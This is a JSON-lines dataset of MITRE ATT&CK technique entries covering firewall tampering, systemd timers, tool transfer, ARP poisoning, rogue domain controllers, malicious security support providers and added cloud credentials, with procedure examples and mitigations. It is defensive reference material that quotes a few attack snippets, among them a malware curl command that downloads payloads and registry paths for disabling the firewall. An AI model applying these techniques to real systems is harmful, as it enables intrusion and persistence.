{"text": " Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel. Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.", "idx": "https://attack.mitre.org/techniques/T1562/004", "title": "Disable or Modify System Firewall", "entity": "Disable or Modify System Firewall", "entity_type": "techniques", "entity_context": ["InvisiMole has a command to disable routing and the Firewall on the victim’s machine.", "Rocke used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.\t", "Ensure proper user permissions are in place to prevent adversaries from disabling or modifying firewall settings.", "The \"ZR\" variant of BACKSPACE will check to see if known host-based firewalls are installed on the infected systems. BACKSPACE will attempt to establish a C2 channel, then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.", "APT38 have created firewall exemptions on specific ports, including ports 443, 6443, 8443, and 9443.", "Operation Wocao has used PowerShell to add and delete rules in the Windows firewall.", "Carbanak may use netsh to add local firewall rule exceptions.", "Grandoreiro can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.", "Kimsuky has been observed disabling the system firewall.", "NanoCore can modify the victim's firewall.", "netsh can be used to disable local firewall settings.", "Various Lazarus Group malware modifies the Windows firewall to allow incoming connections or disable it entirely using netsh. ", "TeamTNT has disabled <code>iptables</code>.", "CookieMiner has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found.", "HOPLIGHT has modified the firewall using netsh.\t", "APT29 used <code>netsh</code> to configure firewall rules that limited certain UDP outbound packets.", "njRAT has modified the Windows firewall to allow itself to communicate through the firewall.", "Remsec can add or remove applications or ports on the Windows firewall or disable it entirely.", "Dragonfly 2.0 has disabled host-based firewalls. The group has also globally opened port 3389.", "Ensure proper process and file permissions are in place to prevent adversaries from disabling or modifying firewall settings.", "BADCALL disables the Windows firewall before binding to a port.", "H1N1 kills and disables services for Windows Firewall.", "DarkComet can disable Security Center functions like the Windows Firewall.", "TYPEFRAME can open the Windows Firewall on the victim’s machine to allow incoming connections.", "Kasidet has the ability to change firewall settings to allow a plug-in to be downloaded.", "Ensure proper Registry permissions are in place to prevent adversaries from disabling or modifying firewall settings.", "HARDRAIN opens the Windows Firewall to modify incoming connections.", "ZxShell can disable the firewall by modifying the registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile</code>. "], "is_subtechnique": true}
{"text": " Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control) Each <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>. An adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.", "idx": "https://attack.mitre.org/techniques/T1053/006", "title": "Systemd Timers", "entity": "Systemd Timers", "entity_type": "techniques", "entity_context": ["Restrict read/write access to systemd <code>.timer</code> unit files to only select privileged users who have a legitimate need to manage system services.", "Limit access to the root account and prevent users from creating and/or modifying systemd timer unit files. ", "Limit user access to system utilities such as 'systemctl' or 'systemd-run' to users who have a legitimate need."], "is_subtechnique": true}
{"text": " Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.", "idx": "https://attack.mitre.org/techniques/T1105", "title": "Ingress Tool Transfer", "entity": "Ingress Tool Transfer", "entity_type": "techniques", "entity_context": ["PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.", "Hydraq creates a backdoor through which remote attackers can download files and additional malware components.", "POWRUNER can download or upload files from its C2 server.", "SeaDuke is capable of uploading and downloading files.", "MCMD can upload additional files to a compromised host.", "Peppy can download and execute remote files.", "Egregor has the ability to download files from its C2 server.", "Elise can download additional files from the C2 server for execution.", "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.", "Evilnum can deploy additional components or tools as needed.", "Bundlore can download and execute new versions of itself.", "AuditCred can download files and additional malware.", "TA505 has downloaded additional malware to execute on victim systems.", "SoreFang can download additional payloads from C2.", "RTM can download additional files.", "CostaBricks has been used to load SombRAT onto a compromised host.", "NanoCore has the capability to download and activate additional modules for execution.", "PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.", "APT38 used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.", "BISCUIT has a command to download a file from the C2 server.", "UPPERCUT can download and upload files to and from the victim’s machine.", "Revenge RAT has the ability to upload and download files.", "NavRAT can download files remotely.", "DropBook can download and execute additional files.", "Hildegard has downloaded additional scripts that build and run Monero cryptocurrency miners.", "Ursnif has dropped payload and configuration files to disk. Ursnif has also been used to download and execute additional payloads.", "RDAT can download files via DNS.\t", "Vasport can download files.", "ShimRatReporter had the ability to download additional payloads.", "Azorult can download and execute additional files. Azorult has also downloaded a ransomware payload called Hermes.", "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.", "SDBbot has the ability to download a DLL from C2 to a compromised host.", "Andariel has downloaded additional tools and malware onto compromised hosts.", "RainyDay can download files to a compromised host.", "APT29 has downloaded additional tools, such as TEARDROP malware and Cobalt Strike, to a compromised host following initial access.", "Bandook can download files to the system.", "RemoteUtilities can upload and download files to and from a target machine.", "Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.", "HyperBro has the ability to download additional files.", "Dtrack’s can download and upload a file to the victim’s computer.", "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.", "BITSAdmin can be used to create BITS Jobs to upload and/or download files.", "NETWIRE can downloaded payloads from C2 to the compromised host.", "Zebrocy obtains additional code to execute on the victim's machine, including the downloading of a secondary payload.", "FYAnti can download additional payloads to a compromised host.\t ", "APT41 used certutil to download additional files.", "InvisiMole can upload files to the victim's machine for operations.", "APT33 has downloaded additional files and programs from its C2 server.\t\n", "Crimson contains a command to retrieve files from its C2 server.", "NanHaiShu can download additional files from URLs.", "Ajax Security Team has used Wrapper/Gholee, custom-developed malware, which downloaded additional malware to the infected system.", "QuasarRAT can download files to the victim’s machine and execute them.", "ThiefQuest can download and execute payloads in-memory or from disk.", "KEYMARBLE can upload files to the victim’s machine and can download additional payloads.", "APT39 has downloaded tools to compromised hosts.", "Pteranodon can download and execute additional files.", "REvil can download a copy of itself from an attacker controlled IP address to the victim machine.", "Cuba can download files from its C2 server.", "Cardinal RAT can download and execute additional payloads.", "certutil can be used to download files from a given URL.", "Nebulae can download files from C2.", "APT-C-36 has downloaded binary data from a specified domain after the malicious document is opened.", "RedLeaves is capable of downloading a file from a specified URL.", "KeyBoy has a download and upload functionality.", "Attor can download additional plugins, updates and other files. ", "TA551 has retrieved DLLs and installer binaries for malware execution from C2.", "DarkComet can load any files onto the infected machine to execute.", "JSS Loader has the ability to download malicious executables to a compromised host.", "YAHOYAH uses HTTP GET requests to download other files that are executed in memory.", "TrickBot downloads several additional files and saves them to the victim's machine.", "HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. ", "SEASHARPEE can download remote files onto victims.", "POSHSPY downloads and executes additional PowerShell code and Windows binaries.", "SUNBURST delivered different payloads, including TEARDROP in at least one instance.", "Daserf can download remote files.", "down_new has the ability to download files to the compromised host.", "njRAT can download files to the victim’s machine.", "BackConfig can download and execute additional payloads on a compromised host.", "Micropsia can download and execute an executable from the C2 server.", "Cobalt Strike can deliver additional payloads to victim machines.", "Ixeshe can download and execute additional files.", "Winnti for Linux has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. ", "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.", "QakBot has the ability to download additional components and malware.", "Fox Kitten has downloaded additional tools including PsExec directly to endpoints.", "Melcoz has the ability to download additional files to a compromised host.", "Caterpillar WebShell has a module to download and upload files to the system. ", "SMOKEDHAM has used Powershell to download UltraVNC and Ngrok from third-party file sharing sites.", "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.", "ServHelper may download additional files to execute.", "BONDUPDATER can download or upload files from its C2 server.", "RegDuke can download files from C2.", "Several Lazarus Group malware families are capable of downloading and executing binaries from its C2 server.", "Kessel can download additional modules from the C2 server.", "Kwampirs downloads additional files from C2 servers.", "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.", "RATANKBA uploads and downloads information.", "CARROTBAT has the ability to download and execute a remote file via certutil.", "Javali can download payloads from remote C2 servers.", "Mustang Panda has downloaded additional executables following the initial infection stage.", "Sharpshooter downloaded additional payloads after a target was infected with a first-stage downloader.", "Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.", "Avenger has the ability to download files from C2 to a compromised host.", "PLEAD has the ability to upload and download files to and from an infected host.", "gh0st RAT can download files to the victim’s machine.", "Mivast has the capability to download and execute .exe files.", "HotCroissant has the ability to upload a file from the command and control (C2) server to the victim machine.", "Helminth can download additional files.", "Bisonal has the capability to download files to execute on the victim’s machine.", "esentutl can be used to copy files from a given URL.", "KGH_SPY has the ability to download and execute code from remote servers.", "Seth-Locker has the ability to download and execute files on a compromised host.", "ShadowPad has downloaded code from a C2 server.", "Darkhotel has used first-stage payloads that download additional malware from C2 servers.", "HOPLIGHT has the ability to connect to a remote host in order to upload and download files.\t", "Bonadan can download additional modules from the C2 server.", "Molerats used executables to download malicious files from different sources. ", "Mosquito can upload and download files to the victim.", "CHOPSTICK is capable of performing remote file transmission.", "Frankenstein has uploaded and downloaded files to utilize additional plugins.", "MoleNet can download additional payloads from the C2. ", "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.", "PolyglotDuke can retrieve payloads from the C2 server.", "Orz can download files onto the victim.", "OilRig can download remote files onto victims.", "GALLIUM dropped additional tools to victims during their operation, including portqry.exe, a renamed cmd.exe file, winrar, and HTRAN.", "Aria-body has the ability to download additional payloads from C2.", "Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.", "LiteDuke has the ability to download files.", "BoxCaon can download files.", "Pony can download additional files onto the infected system.\t", "Sliver can upload files from the C2 server to the victim machine using the <code>upload</code> command.", "Magic Hound has downloaded additional code and files from servers onto victims. ", "HTTPBrowser is capable of writing a file to the compromised system from the C2 server.", "BLINDINGCAN has downloaded files to a victim machine.", "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.", "VaporRage has the ability to download malicious shellcode to compromised systems.", "Cannon can download a payload for execution.", "Grandoreiro can download its second stage from a hardcoded URL within the loader's code.", "FELIXROOT downloads and uploads files to and from the victim’s machine.", "GreyEnergy can download additional modules and payloads.", "Skidmap has the ability to download files on an infected host. ", "MechaFlounder has the ability to upload and download files to and from a compromised host.", "ChChes is capable of downloading files, including additional modules.", "Cobalt Group has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files.", "Operators deploying Netwalker have used psexec and certutil to retrieve the Netwalker payload.", "Pisloader has a command to upload a file to the victim machine.", "PowerDuke has a command to download a file.", "Volgmer can download remote files and additional payloads to the victim's machine.", "KARAE can upload and download files, including second-stage malware.", "CoinTicker executes a Python script to download its second stage.", "KONNI can download files and execute them on the victim’s machine.", "Nomadic Octopus has used malicious macros to download additional files to the victim's machine. ", "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).", "MarkiRAT can download additional files and tools from its C2 server, including through the use of BITSAdmin.", "TURNEDUP is capable of downloading additional files.", "WEBC2 can download and execute a file.", "Penquin can execute the command code <code>do_download</code> to retrieve remote files from C2.", "Hi-Zor has the ability to upload and download files from its C2 server.", "Patchwork payloads download additional files from the C2 server.", "Psylo has a command to download a file to the system from its C2 server.", "Koadic can download additional files.", "SharpStage has the ability to download and execute additional payloads via a DropBox API.", "APT18 can upload a file to the victim’s machine.", "BLUELIGHT can download additional files onto the host. ", "jRAT can download and execute files.", "Sakula has the capability to download files.", "Tools used by Gamaredon Group are capable of downloading and executing additional payloads.", "Bankshot uploads files and secondary payloads to the victim's machine.", "Chaes can download additional files onto an infected machine.", "ZxShell has a command to transfer files from a remote host. ", "Volatile Cedar can deploy additional tools.", "CSPY Downloader can download additional tools to a compromised host.", "Agent Tesla can download additional files for execution on the victim’s machine.", "Metamorfo has used MSI files to download additional files to execute. ", "Sidewinder has used LNK files to download remote files to the victim's network.", "Seasalt has a command to download additional files.", "Explosive has a function to download a file to the infected system. ", "SLOWDRIFT downloads additional payloads.", "ZLib has the ability to download files.", "Sibot can download and execute a payload onto a compromised system.", "Doki has downloaded scripts from C2.", "TeamTNT has the curl command and batch scripts to download new tools.", "Whitefly has the ability to download additional tools from the C2.", "SideTwist has the ability to download additional files.", "VERMIN can download and upload files to the victim's machine.", "BADFLICK has download files from its C2 server.", "SpicyOmelette can download malicious files from threat actor controlled AWS URL's.", "Operation Wocao can download additional files to the infected system.", "PoisonIvy creates a backdoor through which remote attackers can upload files.", "RemoteCMD copies a file over to the remote system before execution.", "BBK has the ability to download files from C2 to the infected host.", "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.", "GoldenSpy constantly attempts to download and execute files from the remote C2, including GoldenSpy itself if not found on the system.\t", "Kivars has the ability to download and execute files.", "Taidoor has downloaded additional files onto a compromised host.", "Calisto has the capability to upload and download files to the victim's machine.", "Pupy can upload and download to/from a victim machine.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.", "MuddyWater has used malware that can upload additional files to the victim’s machine.", "OSX_OCEANLOTUS.D has a command to download and execute a file on the victim’s machine.", "build_downer has the ability to download files from C2 to the infected host.", "NOKKI has downloaded a remote module for execution.", "Exaramel for Linux has a command to download a file from  and to a remote C2 server.", "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.", "BlackMould has the ability to download files to the victim's machine.", "ZeroT can download additional payloads onto the victim.", "Shamoon can download an executable to run on the victim.", "ROKRAT retrieves additional malicious payloads from the C2 server.", "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.", "SpeakUp downloads and executes additional files from a remote server. ", "P8RAT can download additional payloads to a target system.", "Dragonfly 2.0 copied and installed tools for operations once in the victim environment.", "Valak has downloaded a variety of modules and payloads to the compromised host, including IcedID and NetSupport Manager RAT-based malware.", "ZIRCONIUM has used tools to download malicious files to compromised hosts.", "Tropic Trooper has used a delivered trojan to download additional files.", "China Chopper's server component can download remote files.", "Lucifer can download and execute a replica of itself using certutil.", "Dacls can download its payload from a C2 server.", "Okrum has built-in commands for uploading, downloading, and executing files to the system.", "Turian can download additional files and tools from its C2.", "Rancor has downloaded additional malware, including by using certutil.", "cmd can be used to copy files to/from a remotely connected external system.", "GoldMax can download and execute additional files.", "Briba downloads files onto infected hosts.", "APT37 has downloaded second stage malware from compromised websites.", "Wiarp creates a backdoor through which remote attackers can download files.", "More_eggs can download and launch additional payloads.", "Windshift has used tools to deploy additional payloads to compromised hosts.", "Zeus Panda can download additional malware plug-in modules and execute them on the victim’s machine.", "OopsIE can download files from its C2 server to the victim's machine.", "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.", "Kasidet has the ability to download and execute additional files.", "TYPEFRAME can upload and download files to the victim’s machine.", "TSCookie has the ability to upload and download files to and from the infected host.", "Xbash can download additional malicious files from its C2 server.", "WellMail can receive data and executable scripts from C2.", "Anchor can download additional payloads.", "Gazer can execute a task to download a file.", "StoneDrill has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.\t", "APT3 has a tool that can copy files to remote machines.", "PUNCHBUGGY can download additional files and payloads to compromised hosts.", "TAINTEDSCRIBE can download additional modules from its C2 server.", "CARROTBALL has the ability to download and install a remote payload.", "Waterbear can receive and load executables from remote C2 servers.", "RGDoor uploads and downloads files to and from the victim’s machine.", "Gorgon Group malware can download additional files from C2 servers.", "menuPass has installed updates and new malware on victims.", "Chimera has remotely copied tools and malware onto targeted systems.", "SHUTTERSPEED can download and execute an arbitary executable.", "Empire can upload and download to and from a victim machine.", "Dipsind can download remote files.", "After re-establishing access to a victim network, Threat Group-3390 actors download tools including gsecdump and WCE that are staged temporarily on websites that were previously compromised but never used.", "Bazar can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as Cobalt Strike.", "Agent.btz attempts to download an encrypted binary from a specified domain.", "XCSSET downloads browser specific AppleScript modules using a constructed URL with the <code>curl</code> command, <code>https://\" & domain & \"/agent/scripts/\" & moduleName & \".applescript</code>.", "Industroyer downloads a shellcode payload from a remote C2 server and loads it into memory.", "LoudMiner used SCP to update the miner from the C2.", "GuLoader can download further malware for execution on the victim's machine.", "IcedID has the ability to download additional modules and a configuration file from C2.", "TDTESS has a command to download and execute an additional file.", "FIN8 has used remote code execution to download subsequent payloads.", "Lokibot downloaded several staged items onto the victim's machine. ", "SQLRat can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.\t", "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.", "ShimRat can download additional files.", "Conficker downloads an HTTP server to the infected machine.", "can download and execute a second-stage payload.", "Dyre has a command to download and executes additional files.", "BackdoorDiplomacy has downloaded additional files and tools onto a compromised host.", "Nerex creates a backdoor through which remote attackers can download files onto a compromised host.", "SodaMaster has the ability to download additional payloads from C2 to the targeted system.", "Carberp can download and execute new plugins from the C2 server. ", "Rocke used malware to download additional malicious files to the target system.\t", "CORESHELL downloads another dropper from its C2 server.", "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.", "Tonto Team has downloaded malicious DLLs which served as a ShadowPad loader.", "SLOTHFULMEDIA has downloaded files onto a victim machine.", "Octopus can download additional files and tools onto the victim’s machine.", "PLAINTEE has downloaded and executed additional plugins.", "Leviathan has downloaded additional scripts and files from adversary-controlled servers.", "DEATHRANSOM can download files to a compromised host.", "Pasam creates a backdoor through which remote attackers can upload files.", "BendyBear is designed to download an implant from a C2 server.", "Misdat is capable of downloading files from the C2.", "WellMess can write files to a compromised host.", "Kimsuky has used scripts to download additional tools from compromised domains to victim systems.", "GrimAgent has the ability to download and execute additional payloads.", "BadPatch can download and execute or update malware.", "JPIN can download files and upgrade itself.", "Denis deploys additional backdoors and hacking tools to the system.", "Ecipekac can download additional payloads to a compromised host.", "HiddenWasp downloads a tar compressed archive from a download server to the system.", "ABK has the ability to download files from C2.", "SHARPSTATS has the ability to upload and download files.", "JHUHUGIT can retrieve an additional payload from its C2 server. JHUHUGIT has a command to download files to the victim’s machine.", "Kinsing has downloaded additional lateral movement scripts from C2.", "StrongPity can download files to specified targets.", "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.", "Remcos can upload and download files to and from the victim’s machine.", "EvilBunny has downloaded additional Lua scripts from the C2.", "Astaroth uses certutil and BITSAdmin to download additional malware. ", "CallMe has the capability to download a file to the victim from the C2 server.", "Unknown Logger is capable of downloading remote files.", "Nidiran can download and execute files.", "CookieMiner can download additional scripts from a web server.", "Hancitor has the ability to download additional files from C2.", "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.", "Turla has used shellcode to download Meterpreter after compromising a victim.", "UBoatRAT can upload and download files to the victim’s machine.", "PlugX has a module to download and execute files on the compromised machine.", "Drovorub can download files to a compromised host.", "LightNeuron has the ability to download and execute additional files.", "Felismus can download files from remote servers.", "EVILNUM can download and upload files to the victim's computer.", "VBShower has the ability to download VBS files to the target computer.", "Silence has downloaded additional modules and malware to victim’s machines.\t", "NDiskMonitor can download and execute a file from given URL.", "P.A.S. Webshell can upload and download files to and from compromised hosts.", "PipeMon can install additional modules via C2 commands.", "Gold Dragon can download additional components from the C2 server.", "Trojan.Karagany can upload, download, and execute files on the victim.", "IndigoZebra has downloaded additional files and tools from its C2 server.", "Emissary has the capability to download files from the C2 server.", "Kerrdown can download specific payloads to a compromised host based on OS architecture.", "DOGCALL can download and execute additional payloads.", "RogueRobin can save a new file to the system from the C2 server.", " Machete can download additional files for execution on the victim’s machine. ", "OSX/Shlayer can download payloads, and extract bytes from files. OSX/Shlayer uses the <code>curl -fsL \"$url\" >$tmp_path</code> command to download malicious payloads into a temporary directory.", "xCaon has a command to download files to the victim's machine.", "BoomBox has the ability to download next stage malware components to a compromised system.", "WIRTE has downloaded PowerShell code from the C2 server to be executed.", "SombRAT has the ability to download and execute additional payloads.", "Cryptoistic has the ability to send and receive files.", "BabyShark has downloaded additional files from the C2.", "DDKONG downloads and uploads files on the victim’s machine.", "MiniDuke can download additional encrypted backdoors onto the victim via GIF files."], "is_subtechnique": false}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user. In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)", "idx": "https://attack.mitre.org/techniques/T1021", "title": "Remote Services", "entity": "Remote Services", "entity_type": "techniques", "entity_context": ["Limit the accounts that may use remote services. Limit the permissions for accounts that are at higher risk of compromise; for example, configure SSH so users can only run specific programs.", "Use multi-factor authentication on remote service logons where possible.", "Stuxnet can propagate via peer-to-peer communication and updates using RPC.", "Kivars has the ability to remotely trigger keyboard input and mouse clicks. "], "is_subtechnique": false}
{"text": " Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache. An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment. The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add", "idx": "https://attack.mitre.org/techniques/T1557/002", "title": "ARP Cache Poisoning", "entity": "ARP Cache Poisoning", "entity_type": "techniques", "entity_context": ["Create static ARP entries for networked devices. Implementing static ARP entries may be infeasible for large networks.", "Consider enabling DHCP Snooping and Dynamic ARP Inspection on switches to create mappings between IP addresses requested via DHCP and ARP tables and tie the values to a port on the switch that may block bogus traffic.", "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS.", "Cleaver has used custom tools to facilitate ARP cache poisoning.", "Train users to be suspicious about certificate errors. Adversaries may use their own certificates in an attempt to intercept HTTPS traffic. Certificate errors may arise when the application’s certificate does not match the one expected by the host.", "Network intrusion detection and prevention systems that can identify traffic patterns indicative of AiTM activity can be used to mitigate activity at the network level.", "Consider disabling updating the ARP cache on gratuitous ARP replies."], "is_subtechnique": true}
{"text": " Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide) This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)", "idx": "https://attack.mitre.org/techniques/T1207", "title": "Rogue Domain Controller", "entity": "Rogue Domain Controller", "entity_type": "techniques", "entity_context": ["Mimikatz’s <code>LSADUMP::DCShadow</code> module can be used to make AD updates by temporarily setting a computer to be a DC."], "is_subtechnique": false}
{"text": " Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)", "idx": "https://attack.mitre.org/techniques/T1547/005", "title": "Security Support Provider", "entity": "Security Support Provider", "entity_type": "techniques", "entity_context": ["Windows 8.1, Windows Server 2012 R2, and later versions may make LSA run as a Protected Process Light (PPL) by setting the Registry key <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code>, which requires all SSP DLLs to be signed by Microsoft.  ", "Empire can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's <code>Install-SSP</code> and <code>Invoke-Mimikatz</code> to install malicious SSPs and log authentication events.", "The Mimikatz credential dumper contains an implementation of an SSP.", "PowerSploit's <code>Install-SSP</code> Persistence module can be used to establish by installing a SSP DLL."], "is_subtechnique": true}
{"text": " Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment. Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD.(Citation: Microsoft SolarWinds Customer Guidance)(Citation: Blue Cloud of Death)(Citation: Blue Cloud of Death Video) These credentials include both x509 keys and passwords.(Citation: Microsoft SolarWinds Customer Guidance) With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.(Citation: Demystifying Azure AD Service Principals) In infrastructure-as-a-service (IaaS) environments, after gaining access through [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries may generate or import their own SSH keys using either the <code>CreateKeyPair</code> or <code>ImportKeyPair</code> API in AWS or the <code>gcloud compute os-login ssh-keys add</code> command in GCP.(Citation: GCP SSH Key Add) This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.(Citation: Expel IO Evil in AWS)(Citation: Expel Behind the Scenes)", "idx": "https://attack.mitre.org/techniques/T1098/001", "title": "Additional Cloud Credentials", "entity": "Additional Cloud Credentials", "entity_type": "techniques", "entity_context": ["APT29 has added credentials to OAuth Applications and Service Principals. ", "Use multi-factor authentication for user and privileged accounts. Consider enforcing multi-factor authentication for the <code>CreateKeyPair</code> and <code>ImportKeyPair</code> API calls through IAM policies.", "Configure access controls and firewalls to limit access to critical systems and domain controllers. Most cloud environments support separate virtual private cloud (VPC) instances that enable further segmentation of 